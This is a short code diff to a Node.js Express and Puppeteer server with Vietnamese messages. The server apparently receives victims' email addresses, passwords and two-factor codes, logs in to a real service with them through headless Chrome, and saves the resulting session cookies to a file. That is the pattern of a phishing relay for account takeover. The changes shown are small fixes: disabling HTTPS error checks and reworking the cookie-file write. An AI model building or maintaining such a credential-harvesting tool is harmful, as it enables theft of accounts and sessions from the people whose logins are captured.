@@ -1,6 +1,7 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const puppeteer = require('puppeteer');
+const fs = require('fs');
 
 const app = express();
 const port = 5003;
@@ -14,6 +15,7 @@ app.use(bodyParser.json());
 async function createHeadlessBrowser() {
   const browser = await puppeteer.launch({
     executablePath: 'C:/Program Files/Google/Chrome/Application/chrome.exe', // Điều chỉnh đường dẫn tới Chrome ở đây
+    ignoreHTTPSErrors: true,
   });
   const page = await browser.newPage();
   return { browser, page };
@@ -110,7 +112,14 @@ app.post('/check-password', async (req, res) => {
   const { isLoginSuccessful, cookies } = await verifyPassword(email, password);
 
   if (isLoginSuccessful) {
-    await fs.writeFile(COOKIES_FILE_PATH, JSON.stringify(cookies)); // Ghi cookies vào file
+    // Use a callback function to handle the completion of the writeFile operation
+    fs.writeFile(COOKIES_FILE_PATH, JSON.stringify(cookies), (err) => {
+      if (err) {
+        console.error('Error writing cookies to file:', err);
+      } else {
+        console.log('Cookies have been written to file successfully.');
+      }
+    });
   }
 
   if (isLoginSuccessful) {
@@ -119,6 +128,7 @@ app.post('/check-password', async (req, res) => {
     res.status(400).json({ message: 'Mật khẩu bạn nhập không chính xác.', status: 400 });
   }
 });
+
 
 app.post('/check-towfa', async (req, res) => {
   const { email, password, towfa } = req.body;
